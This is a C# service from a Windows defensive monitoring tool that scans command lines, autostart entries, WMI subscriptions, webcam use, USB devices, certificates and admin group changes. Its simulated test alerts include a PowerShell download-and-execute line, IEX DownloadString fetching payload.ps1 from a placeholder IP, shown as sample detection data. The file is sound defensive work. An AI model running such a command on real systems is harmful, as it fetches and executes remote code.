using System.Collections.Concurrent;
using System.Diagnostics;
using AnzenSecurityWatcher.Models;

namespace AnzenSecurityWatcher.Services;

/// <summary>
/// システム防御エンジン統括サービス
/// - 自動起動エントリ監視 (#1)
/// - コマンドライン解析 (#12)
/// - カメラ・マイク使用検知 (#17)
/// - キーロガー兆候検知
/// - クリップボード監視プロセス検知
/// - USB デバイス接続検知 (BadUSB 等)
/// - ルート証明書ストアへの不審追加検知
/// - ログオン失敗・アカウント作成監視 (4625 / 4720 / 4732)
/// - ローカル管理者グループの変更検知
/// - DLL サイドローディング検知
/// - セキュリティ設定診断 (#21 安全スコア)
/// </summary>
public class SystemDefenseService
{
    private const string AckFile = "acknowledged_findings.json";

    private readonly AutostartMonitorService _autostartService = new();
    private readonly WmiSubscriptionMonitorService _wmiSubscriptionService = new();
    private readonly PrivacyHardwareMonitorService _privacyService = new();
    private readonly DllSideloadScanner _dllSideloadScanner = new();
    private readonly SystemIntegrityMonitorService _integrityService = new();
    private readonly SecurityPostureService _postureService = new();

    private readonly ConcurrentDictionary<string, SystemFindingItem> _findingsMap = new(StringComparer.OrdinalIgnoreCase);
    private HashSet<string> _acknowledgedKeys = new(StringComparer.OrdinalIgnoreCase);
    private bool _ackLoaded;

    private DateTime _lastSlowScan = DateTime.MinValue;
    private bool _lastDllSideloadEnabled = false;
    private AppLanguage _lastLang = AppLanguage.English;
    private List<FindingReport> _cachedSlowReports = new();
    private SecurityPostureReport _latestPosture = new();

    public SecurityPostureReport LatestPosture => _latestPosture;

    public (List<SystemFindingItem> Findings, SecurityPostureReport Posture) ScanAll(bool forceFull = false, bool enableDllSideloadCheck = false)
    {
        EnsureAckLoaded();

        bool langChanged = _lastLang != LocalizationManager.CurrentLanguage;
        if (langChanged)
        {
            _lastLang = LocalizationManager.CurrentLanguage;
            forceFull = true;
            if (_findingsMap.Values.Any(x => x.IsSimulated))
            {
                InjectSimulatedFindings();
            }
        }

        if (enableDllSideloadCheck != _lastDllSideloadEnabled)
        {
            _lastDllSideloadEnabled = enableDllSideloadCheck;
            forceFull = true;
        }

        // 毎回実行する軽量スキャン: カメラ・マイク使用中検知、クリップボード監視、稼働中プロセスのコマンドライン解析
        var currentReports = new List<FindingReport>();
        currentReports.AddRange(_privacyService.ScanFast());
        currentReports.AddRange(ScanRunningProcessCommandLines());

        // スキャン間隔設定に連動して実行する詳細スキャン (高速: 18秒 / 標準: 30秒 / 省電力: 90秒):
        // 自動起動、WMI永続化、キーロガー兆候、USB、DLLサイドロード(有効時のみ)、証明書、イベントログ、管理者グループ、安全スコア
        int fastIntervalSec = (int)SettingsManager.Current.ScanInterval;
        if (fastIntervalSec <= 0) fastIntervalSec = 3;
        int slowIntervalSec = fastIntervalSec * 6;

        if (forceFull || (DateTime.Now - _lastSlowScan).TotalSeconds >= slowIntervalSec || _cachedSlowReports.Count == 0)
        {
            _lastSlowScan = DateTime.Now;
            var slow = new List<FindingReport>();
            slow.AddRange(_autostartService.Scan());
            slow.AddRange(_wmiSubscriptionService.Scan());
            slow.AddRange(_privacyService.ScanSlow());
            if (enableDllSideloadCheck)
            {
                slow.AddRange(_dllSideloadScanner.Scan(forceFull));
            }
            slow.AddRange(_integrityService.Scan());

            _latestPosture = _postureService.Evaluate(forceFull);
            foreach (var chk in _latestPosture.Checks.Where(c => c.Result is CheckResult.Fail or CheckResult.Warning))
            {
                var sev = chk.Result == CheckResult.Fail ? RiskLevel.High : RiskLevel.Medium;
                string tech = Loc.T(
                    $"Check Item: {chk.Name}\nResult: {chk.ResultBadge} (Points: {chk.WeightText})\nCurrent Status: {chk.StatusText}\nRecommendation: {chk.Advice}",
                    $"诊断项目: {chk.Name}\n判定结果: {chk.ResultBadge} (分值: {chk.WeightText})\n当前状态: {chk.StatusText}\n改进建议: {chk.Advice}",
                    $"Elemento: {chk.Name}\nResultado: {chk.ResultBadge} (Puntos: {chk.WeightText})\nEstado actual: {chk.StatusText}\nConsejo: {chk.Advice}",
                    $"診断項目: {chk.Name}\n判定: {chk.ResultBadge} (配点: {chk.WeightText})\n現在の状態: {chk.StatusText}\n改善アドバイス: {chk.Advice}");

                slow.Add(new FindingReport(
                    Key: $"POSTURE:{chk.Id}",
                    Category: FindingCategory.SecurityConfig,
                    Severity: sev,
                    State: FindingState.Existing,
                    Title: $"{chk.Name} — {chk.ResultBadge}",
                    Detail: $"{chk.StatusText} ({chk.Advice})",
                    Target: chk.Name,
                    TechnicalDetails: tech,
                    RecommendedAction: chk.Advice));
            }

            _cachedSlowReports = slow;
        }
        else if (_latestPosture.Checks.Count == 0)
        {
            _latestPosture = _postureService.Evaluate(false);
        }

        currentReports.AddRange(_cachedSlowReports);

        // レポートを _findingsMap に統合
        var activeKeysThisCycle = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        DateTime now = DateTime.Now;

        foreach (var rep in currentReports)
        {
            activeKeysThisCycle.Add(rep.Key);
            bool isAck = _acknowledgedKeys.Contains(rep.Key);

            if (!_findingsMap.TryGetValue(rep.Key, out var item))
            {
                item = new SystemFindingItem
                {
                    Key = rep.Key,
                    Category = rep.Category,
                    Severity = rep.Severity,
                    State = rep.State,
                    Title = rep.Title,
                    Detail = rep.Detail,
                    Target = rep.Target,
                    TechnicalDetails = rep.TechnicalDetails,
                    RecommendedAction = rep.RecommendedAction,
                    OpenLocationPath = rep.OpenLocationPath,
                    ProcessId = rep.ProcessId,
                    FirstSeen = now,
                    LastSeen = now,
                    IsAcknowledged = isAck,
                    IsSimulated = rep.IsSimulated
                };
                _findingsMap[rep.Key] = item;
            }
            else
            {
                item.Severity = rep.Severity;
                item.State = rep.State;
                item.Title = rep.Title;
                item.Detail = rep.Detail;
                item.Target = rep.Target;
                item.TechnicalDetails = rep.TechnicalDetails;
                item.RecommendedAction = rep.RecommendedAction;
                item.OpenLocationPath = rep.OpenLocationPath;
                item.ProcessId = rep.ProcessId;
                item.LastSeen = now;
                item.IsAcknowledged = isAck;
                if (langChanged)
                {
                    item.RefreshLocalization();
                }
            }
        }

        if (langChanged)
        {
            foreach (var kv in _findingsMap)
            {
                kv.Value.RefreshLocalization();
            }
        }

        // DLLサイドロードチェックがオフの場合は既存の非模擬検知データをクリア
        if (!enableDllSideloadCheck)
        {
            _cachedSlowReports.RemoveAll(r => r.Category == FindingCategory.DllSideload && !r.IsSimulated);
            var sideloadKeys = _findingsMap
                .Where(kv => kv.Value.Category == FindingCategory.DllSideload && !kv.Value.IsSimulated)
                .Select(kv => kv.Key)
                .ToList();
            foreach (var k in sideloadKeys)
            {
                _findingsMap.TryRemove(k, out _);
            }
        }

        // カメラ・マイクやプロセス等で終了したものを Resolved に更新（模擬データは維持）
        foreach (var kv in _findingsMap)
        {
            if (kv.Value.IsSimulated) continue;
            if (!activeKeysThisCycle.Contains(kv.Key) && kv.Value.State == FindingState.Active)
            {
                kv.Value.State = FindingState.Resolved;
            }
        }

        var ordered = _findingsMap.Values
            .OrderByDescending(x => x.IsSimulated)
            .ThenByDescending(x => x.EffectiveSeverity)
            .ThenByDescending(x => x.State == FindingState.Active || x.State == FindingState.New)
            .ThenByDescending(x => x.LastSeen)
            .ToList();

        return (ordered, _latestPosture);
    }

    // 稼働中プロセスのコマンドライン解析 (#12)
    private static List<FindingReport> ScanRunningProcessCommandLines()
    {
        var reports = new List<FindingReport>();
        Process[] procs;
        try { procs = Process.GetProcesses(); }
        catch { return reports; }

        try
        {
            // PID -> プロセス名辞書を作って親プロセス名を高速解決
            var pidNames = new Dictionary<int, string>();
            foreach (var p in procs)
            {
                try { pidNames[p.Id] = p.ProcessName; } catch { }
            }

            foreach (var p in procs)
            {
                try
                {
                    int pid = p.Id;
                    if (pid <= 4 || pid == Environment.ProcessId) continue;

                    var identity = NativeSecurity.QueryProcessIdentity(pid);
                    if (identity == null || string.IsNullOrWhiteSpace(identity.CommandLine)) continue;

                    pidNames.TryGetValue(identity.ParentPid, out string? parentName);
                    var analysis = CommandLineAnalyzer.Analyze(identity.CommandLine, p.ProcessName, parentName ?? "");
                    if (!analysis.IsSuspicious) continue;

                    string shortCmd = CommandLineAnalyzer.Shorten(identity.CommandLine, 180);
                    string title = Loc.T(
                        $"⌨️ [Suspicious Command Line] {p.ProcessName} (PID:{pid}) — {analysis.ReasonText}",
                        $"⌨️ [可疑命令行] {p.ProcessName} (PID:{pid}) — {analysis.ReasonText}",
                        $"⌨️ [Línea de comandos sospechosa] {p.ProcessName} (PID:{pid}) — {analysis.ReasonText}",
                        $"⌨️ [不審コマンドライン] {p.ProcessName} (PID:{pid}) — {analysis.ReasonText}");

                    string argsLabel = Loc.T("Args", "参数", "Args", "引数");
                    string decodedLabel = Loc.T("Decoded", "解码", "Decodificado", "復号");
                    string detail = $"{argsLabel}: {shortCmd}" +
                        (string.IsNullOrEmpty(analysis.DecodedPayload)
                            ? ""
                            : $" [{decodedLabel}: {CommandLineAnalyzer.Shorten(analysis.DecodedPayload, 100)}]");

                    string parentDesc = string.IsNullOrEmpty(parentName)
                        ? $"PID:{identity.ParentPid}"
                        : $"{parentName} (PID:{identity.ParentPid})";
                    string decodedBlock = string.IsNullOrEmpty(analysis.DecodedPayload)
                        ? ""
                        : Loc.T(
                            $"Base64 Decoded Payload:\n{analysis.DecodedPayload}\n",
                            $"Base64 解码载荷:\n{analysis.DecodedPayload}\n",
                            $"Carga útil Base64 decodificada:\n{analysis.DecodedPayload}\n",
                            $"Base64復号ペイロード:\n{analysis.DecodedPayload}\n");

                    string tech = Loc.T(
                        $"Process Name: {p.ProcessName} (PID: {pid})\nParent Process: {parentDesc}\nExecutable Path: {identity.ImagePath}\nFull Command Line:\n{identity.CommandLine}\n{decodedBlock}Reason: {analysis.ReasonText}",
                        $"进程名: {p.ProcessName} (PID: {pid})\n父进程: {parentDesc}\n可执行文件路径: {identity.ImagePath}\n完整命令行:\n{identity.CommandLine}\n{decodedBlock}检测原因: {analysis.ReasonText}",
                        $"Proceso: {p.ProcessName} (PID: {pid})\nProceso padre: {parentDesc}\nRuta del ejecutable: {identity.ImagePath}\nLínea de comandos completa:\n{identity.CommandLine}\n{decodedBlock}Motivo: {analysis.ReasonText}",
                        $"プロセス名: {p.ProcessName} (PID: {pid})\n親プロセス: {parentDesc}\n実行ファイルパス: {identity.ImagePath}\n完全なコマンドライン:\n{identity.CommandLine}\n{decodedBlock}検知理由: {analysis.ReasonText}");

                    string recAction = Loc.T(
                        "An obfuscated PowerShell or LOLBin command is running. If unrecognized, terminate the process immediately and inspect the parent process and scheduled tasks.",
                        "正在运行混淆的 PowerShell 或 LOLBin 命令。若非本人操作，请立即结束该进程并检查父进程与计划任务。",
                        "Se está ejecutando un comando PowerShell ofuscado o LOLBin. Si no lo reconoce, termine el proceso de inmediato y revise el proceso padre y las tareas programadas.",
                        "難読化されたPowerShellやLOLBinコマンドが実行されています。身に覚えのない処理であれば直ちにプロセスを終了し、親プロセスや自動起動タスクを確認してください。");

                    reports.Add(new FindingReport(
                        Key: $"CMDLINE:{p.ProcessName}:{identity.CommandLine.GetHashCode():X8}",
                        Category: FindingCategory.CommandLine,
                        Severity: analysis.Risk,
                        State: FindingState.Active,
                        Title: title,
                        Detail: detail,
                        Target: identity.ImagePath,
                        TechnicalDetails: tech,
                        RecommendedAction: recAction,
                        OpenLocationPath: identity.ImagePath,
                        ProcessId: pid));
                }
                catch { }
                finally
                {
                    try { p.Dispose(); } catch { }
                }
            }
        }
        finally
        {
            foreach (var p in procs)
            {
                try { p.Dispose(); } catch { }
            }
        }

        return reports;
    }

    public void AcknowledgeFinding(SystemFindingItem item)
    {
        EnsureAckLoaded();
        item.IsAcknowledged = true;
        _acknowledgedKeys.Add(item.Key);
        _autostartService.ApproveEntry(item.Key);
        _wmiSubscriptionService.ApproveEntry(item.Key);
        JsonStore.Save(AckFile, _acknowledgedKeys.ToList());
    }

    private void EnsureAckLoaded()
    {
        if (_ackLoaded) return;
        _ackLoaded = true;
        var list = JsonStore.Load<List<string>>(AckFile);
        if (list != null)
            _acknowledgedKeys = new HashSet<string>(list, StringComparer.OrdinalIgnoreCase);
    }

    /// <summary>
    /// 動作テスト用：システム防御の各カテゴリ（自動起動・難読化コマンド・カメラ使用・DLLサイドロード・キーロガー・USB・証明書・管理者追加）の模擬アラートを注入
    /// </summary>
    public void InjectSimulatedFindings()
    {
        DateTime now = DateTime.Now;
        var sims = new List<SystemFindingItem>
        {
            new()
            {
                Key = "SIM:CMDLINE:POWERSHELL_ENC",
                Category = FindingCategory.CommandLine,
                Severity = RiskLevel.Critical,
                State = FindingState.Active,
                Title = Loc.T(
                    "⌨️ [Suspicious Command Line] powershell.exe [SIMULATION] — Base64 Obfuscation + IEX Download",
                    "⌨️ [可疑命令行] powershell.exe [模拟测试] — Base64 混淆 + IEX 下载执行",
                    "⌨️ [Línea de comandos sospechosa] powershell.exe [SIMULACIÓN] — Ofuscación Base64 + IEX",
                    "⌨️ [不審コマンドライン] powershell.exe [テスト模擬] — Base64難読化 + IEXダウンロード実行"),
                Detail = Loc.T(
                    "Args: powershell.exe -NoP -W Hidden -Enc SQBFAFgA... [Decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/payload.ps1')]",
                    "参数: powershell.exe -NoP -W Hidden -Enc SQBFAFgA... [解码: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/payload.ps1')]",
                    "Args: powershell.exe -NoP -W Hidden -Enc SQBFAFgA... [Decodificado: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/payload.ps1')]",
                    "引数: powershell.exe -NoP -W Hidden -Enc SQBFAFgA... [復号: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/payload.ps1')]"),
                Target = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nProcess: powershell.exe (Parent: WINWORD.EXE)\nDecoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.42/payload.ps1')",
                RecommendedAction = Loc.T(
                    "Terminate the process immediately and quarantine the document file.",
                    "请立即结束该进程并隔离打开的文档文件。",
                    "Termine el proceso inmediatamente y ponga en cuarentena el documento.",
                    "直ちにプロセスを終了し、開いていた文書ファイルを隔離してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            },
            new()
            {
                Key = "SIM:AUTOSTART:RUN_UPDATER",
                Category = FindingCategory.Autostart,
                Severity = RiskLevel.Critical,
                State = FindingState.New,
                Title = Loc.T(
                    "🚀 [Registry Run (HKCU)] WindowsSecurityHelper [SIMULATION]",
                    "🚀 [注册表 Run (HKCU)] WindowsSecurityHelper [模拟测试]",
                    "🚀 [Registro Run (HKCU)] WindowsSecurityHelper [SIMULACIÓN]",
                    "🚀 [レジストリRun (HKCU)] WindowsSecurityHelper [テスト模擬]"),
                Detail = Loc.T(
                    "🆕 Newly registered autostart entry / Unsigned executable in Temp folder — C:\\Users\\User\\AppData\\Local\\Temp\\win_sec_helper.exe",
                    "🆕 监控开始后新注册的自启动项 / 临时文件夹(Temp)内的未签名程序 — C:\\Users\\User\\AppData\\Local\\Temp\\win_sec_helper.exe",
                    "🆕 Entrada de autoinicio recién registrada / Ejecutable sin firmar en Temp — C:\\Users\\User\\AppData\\Local\\Temp\\win_sec_helper.exe",
                    "🆕 監視開始後に新規登録された自動起動エントリ / 一時フォルダ(Temp)内の未署名プログラム — C:\\Users\\User\\AppData\\Local\\Temp\\win_sec_helper.exe"),
                Target = @"C:\Users\User\AppData\Local\Temp\win_sec_helper.exe",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityHelper",
                RecommendedAction = Loc.T(
                    "Remove the entry from Task Manager (Startup) or Registry Editor.",
                    "请从任务管理器“启动应用”或注册表编辑器中删除该条目。",
                    "Elimine la entrada desde el Administrador de tareas (Inicio) o el Editor del Registro.",
                    "タスクマネージャーの「スタートアップ」またはレジストリエディタから該当エントリを削除してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            },
            new()
            {
                Key = "SIM:WMI:FILELESS_CONSUMER",
                Category = FindingCategory.WmiSubscription,
                Severity = RiskLevel.Critical,
                State = FindingState.New,
                Title = Loc.T(
                    "👻 [WMI CommandLineEventConsumer] SysUpdateConsumer (root\\subscription) [SIMULATION]",
                    "👻 [WMI CommandLineEventConsumer] SysUpdateConsumer (root\\subscription) [模拟测试]",
                    "👻 [WMI CommandLineEventConsumer] SysUpdateConsumer (root\\subscription) [SIMULACIÓN]",
                    "👻 [WMI CommandLineEventConsumer] SysUpdateConsumer (root\\subscription) [テスト模擬]"),
                Detail = Loc.T(
                    "🆕 Newly registered WMI event subscription / Fileless command execution via CommandLineEventConsumer — powershell.exe -NoP -W Hidden -Enc ...",
                    "🆕 监控开始后新增的 WMI 事件订阅 / 通过 CommandLineEventConsumer 自动执行命令 — powershell.exe -NoP -W Hidden -Enc ...",
                    "🆕 Suscripción WMI recién registrada / Ejecución sin archivos vía CommandLineEventConsumer — powershell.exe -NoP -W Hidden -Enc ...",
                    "🆕 監視開始後に新規登録された WMI イベントサブスクリプション / CommandLineEventConsumer によるコマンド自動実行 — powershell.exe -NoP -W Hidden -Enc ..."),
                Target = @"root\subscription:CommandLineEventConsumer:SysUpdateConsumer",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nWMI Namespace: root\\subscription\nClass: CommandLineEventConsumer\nName: SysUpdateConsumer",
                RecommendedAction = Loc.T(
                    "Remove the suspicious WMI consumer and binding using Autoruns (WMI tab) or elevated PowerShell.",
                    "请使用 Autoruns 的“WMI”选项卡或管理员 PowerShell 删除可疑的 WMI 消费者与绑定。",
                    "Elimine el consumidor WMI sospechoso usando Autoruns (pestaña WMI) o PowerShell como administrador.",
                    "Autoruns の「WMI」タブ、または管理者 PowerShell (`Get-CimInstance -Namespace root/subscription -ClassName __EventConsumer | Remove-CimInstance`) で不審な WMI コンシューマとバインディングを削除してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            },
            new()
            {
                Key = "SIM:CAMMIC:WEBCAM_SPY",
                Category = FindingCategory.CameraMic,
                Severity = RiskLevel.Critical,
                State = FindingState.Active,
                Title = Loc.T(
                    "📷 [Webcam Active] cam_capture_svc.exe [SIMULATION]",
                    "📷 【正在使用摄像头】cam_capture_svc.exe [模拟测试]",
                    "📷 [Cámara Web en Uso] cam_capture_svc.exe [SIMULACIÓN]",
                    "📷 【カメラ (Webカメラ)使用中】cam_capture_svc.exe [テスト模擬]"),
                Detail = Loc.T(
                    "🔴 Currently using Webcam — Target: C:\\Users\\Public\\cam_capture_svc.exe (Unsigned)",
                    "🔴 当前正在使用摄像头 — 目标: C:\\Users\\Public\\cam_capture_svc.exe (未签名)",
                    "🔴 Usando cámara web actualmente — Destino: C:\\Users\\Public\\cam_capture_svc.exe (Sin firmar)",
                    "🔴 現在 カメラ (Webカメラ) を使用中 — 対象: C:\\Users\\Public\\cam_capture_svc.exe (未署名)"),
                Target = @"C:\Users\Public\cam_capture_svc.exe",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nConsentStore\\webcam LastUsedTimeStop=0 (Active).",
                RecommendedAction = Loc.T(
                    "Revoke camera access permissions and terminate the process.",
                    "请关闭摄像头访问权限并强制结束该进程。",
                    "Desactive los permisos de cámara y termine el proceso.",
                    "カメラのアクセス権をオフにし、該当プロセスを強制終了してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            },
            new()
            {
                Key = "SIM:SIDELOAD:VERSION_DLL",
                Category = FindingCategory.DllSideload,
                Severity = RiskLevel.High,
                State = FindingState.Active,
                Title = Loc.T(
                    "🧩 [DLL Sideloading] OneDriveUpdater + Unsigned version.dll [SIMULATION]",
                    "🧩 [DLL 侧加载隐患] OneDriveUpdater + 未签名 version.dll [模拟测试]",
                    "🧩 [DLL Sideloading] OneDriveUpdater + version.dll sin firmar [SIMULACIÓN]",
                    "🧩 [DLLサイドロード懸念] OneDriveUpdater + 未署名 version.dll [テスト模擬]"),
                Detail = Loc.T(
                    "Unsigned DLL (version.dll) placed in the same folder as a signed EXE (Microsoft Corporation)",
                    "未签名 DLL (version.dll) 与已签名 EXE (Microsoft Corporation) 位于同一文件夹中",
                    "DLL sin firmar (version.dll) ubicada en la misma carpeta que un EXE firmado (Microsoft Corporation)",
                    "署名付きEXE (Microsoft Corporation) と同一フォルダに未署名DLL (version.dll) が配置されています"),
                Target = @"C:\Users\User\AppData\Local\TempUpdate\version.dll",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nDLL Sideloading simulation.",
                RecommendedAction = Loc.T(
                    "Verify the hash of the unsigned DLL and quarantine it if suspicious.",
                    "请检查未签名 DLL 的哈希值，若可疑请立即隔离。",
                    "Verifique el hash de la DLL sin firmar y póngala en cuarentena si es sospechosa.",
                    "未署名DLLのハッシュ値を確認し、不審な場合は隔離してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            },
            new()
            {
                Key = "SIM:KEYLOG:HOOK_AGENT",
                Category = FindingCategory.Keylogger,
                Severity = RiskLevel.Critical,
                State = FindingState.Active,
                Title = Loc.T(
                    "🎹 [Keyhook Indicator] input_sync_agent [SIMULATION]",
                    "🎹 [键盘钩子迹象] input_sync_agent [模拟测试]",
                    "🎹 [Indicio de Keylogger] input_sync_agent [SIMULACIÓN]",
                    "🎹 [キー入力フック兆候] input_sync_agent [テスト模擬]"),
                Detail = Loc.T(
                    "Unsigned process importing global keyhook APIs (SetWindowsHookEx, GetAsyncKeyState) is running",
                    "包含全局键盘钩子 API (SetWindowsHookEx, GetAsyncKeyState) 的未签名进程正在运行",
                    "Proceso sin firmar con APIs de captura de teclado (SetWindowsHookEx, GetAsyncKeyState) en ejecución",
                    "グローバルキーフックAPI (SetWindowsHookEx, GetAsyncKeyState) を持つ未署名プロセスが稼働中"),
                Target = @"C:\Users\User\AppData\Roaming\input_sync_agent.exe",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nKeylogger API import simulation.",
                RecommendedAction = Loc.T(
                    "Suspected keylogger. Terminate the process immediately.",
                    "疑似键盘记录木马，请立即结束该进程。",
                    "Sospecha de keylogger. Termine el proceso inmediatamente.",
                    "キーロガーの疑いがあります。直ちにプロセスを終了してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            },
            new()
            {
                Key = "SIM:USB:BADUSB_HID",
                Category = FindingCategory.UsbDevice,
                Severity = RiskLevel.Critical,
                State = FindingState.New,
                Title = Loc.T(
                    "🔌 [USB HID Input Device] USB Composite HID Keyboard (VID_16C0&PID_0486) [SIMULATION]",
                    "🔌 [USB HID/输入设备] USB Composite HID Keyboard (VID_16C0&PID_0486) [模拟测试]",
                    "🔌 [Dispositivo USB HID] USB Composite HID Keyboard (VID_16C0&PID_0486) [SIMULACIÓN]",
                    "🔌 [USB HID/入力デバイス] USB Composite HID Keyboard (VID_16C0&PID_0486) [テスト模擬]"),
                Detail = Loc.T(
                    "Newly connected USB device with HID keyboard capability (BadUSB / Rubber Ducky alert)",
                    "监控开始后新连接的 USB 设备 / 具有 HID 键盘功能的 USB 设备 (警惕 BadUSB / Rubber Ducky)",
                    "Dispositivo USB recién conectado con función de teclado HID (Alerta BadUSB / Rubber Ducky)",
                    "監視開始後に新しく接続されたUSBデバイス / HIDキーボード機能を持つUSBデバイス (BadUSB / Rubber Ducky 警戒)"),
                Target = @"USB\VID_16C0&PID_0486\SIM_BADUSB_01",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nBadUSB HID injection simulation.",
                RecommendedAction = Loc.T(
                    "Unplug unrecognized USB devices immediately.",
                    "请立即拔出不明来历的 USB 设备。",
                    "Desconecte inmediatamente cualquier dispositivo USB desconocido.",
                    "心当たりのないUSB機器を直ちに取り外してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            },
            new()
            {
                Key = "SIM:CERT:MITM_ROOT",
                Category = FindingCategory.RootCertificate,
                Severity = RiskLevel.Critical,
                State = FindingState.New,
                Title = Loc.T(
                    "📜 [Root Certificate] DO_NOT_TRUST_FiddlerRoot (CurrentUser) [SIMULATION]",
                    "📜 [根证书] DO_NOT_TRUST_FiddlerRoot (CurrentUser) [模拟测试]",
                    "📜 [Certificado Raíz] DO_NOT_TRUST_FiddlerRoot (CurrentUser) [SIMULACIÓN]",
                    "📜 [ルート証明書] DO_NOT_TRUST_FiddlerRoot (CurrentUser) [テスト模擬]"),
                Detail = Loc.T(
                    "Newly added root certificate / HTTPS decryption proxy root certificate",
                    "监控开始后新添加的根证书 / HTTPS 解密代理根证书",
                    "Certificado raíz recién añadido / Certificado para proxy de descifrado HTTPS",
                    "監視開始後に新規追加されたルート証明書 / HTTPS復号プロキシ用のルート証明書"),
                Target = "DO_NOT_TRUST_FiddlerRoot (A1B2C3D4E5F6...)",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nRoot certificate store addition simulation.",
                RecommendedAction = Loc.T(
                    "Open certmgr.msc and remove unrecognized certificates from Trusted Root Certification Authorities.",
                    "请打开 certmgr.msc，从“受信任的根证书颁发机构”中删除不明证书。",
                    "Abra certmgr.msc y elimine los certificados desconocidos de Entidades de certificación raíz de confianza.",
                    "certmgr.msc を開き、「信頼されたルート証明機関」から身に覚えのない証明書を削除してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            },
            new()
            {
                Key = "SIM:ADMIN:BACKDOOR_USER",
                Category = FindingCategory.AdminGroup,
                Severity = RiskLevel.Critical,
                State = FindingState.New,
                Title = Loc.T(
                    "👑 [New Administrator Added!] SUPPORT_388945a0 [SIMULATION]",
                    "👑 【新增管理员组成员！】SUPPORT_388945a0 [模拟测试]",
                    "👑 [¡Nuevo Administrador Añadido!] SUPPORT_388945a0 [SIMULACIÓN]",
                    "👑 【管理者グループ新規追加！】SUPPORT_388945a0 [テスト模擬]"),
                Detail = Loc.T(
                    "Account 'SUPPORT_388945a0' was added to the local Administrators group after monitoring started!",
                    "监控开始后，账户“SUPPORT_388945a0”被添加到了本地 Administrators 组！",
                    "¡La cuenta 'SUPPORT_388945a0' fue añadida al grupo local Administrators!",
                    "監視開始後に Administrators グループへ『SUPPORT_388945a0』が追加されました！"),
                Target = "SUPPORT_388945a0",
                TechnicalDetails = "【テスト模擬データ / Simulation】\nLocal Administrators group addition simulation.",
                RecommendedAction = Loc.T(
                    "Open lusrmgr.msc and disable or delete the unauthorized account.",
                    "请打开 lusrmgr.msc 禁用或删除该未授权账户。",
                    "Abra lusrmgr.msc y desactive o elimine la cuenta no autorizada.",
                    "lusrmgr.msc で該当アカウントを無効化・削除してください。"),
                FirstSeen = now,
                LastSeen = now,
                IsSimulated = true
            }
        };

        foreach (var s in sims)
            _findingsMap[s.Key] = s;
    }

    public void ClearSimulatedFindings()
    {
        var keys = _findingsMap.Keys.Where(k => k.StartsWith("SIM:")).ToList();
        foreach (var k in keys)
            _findingsMap.TryRemove(k, out _);
    }
}
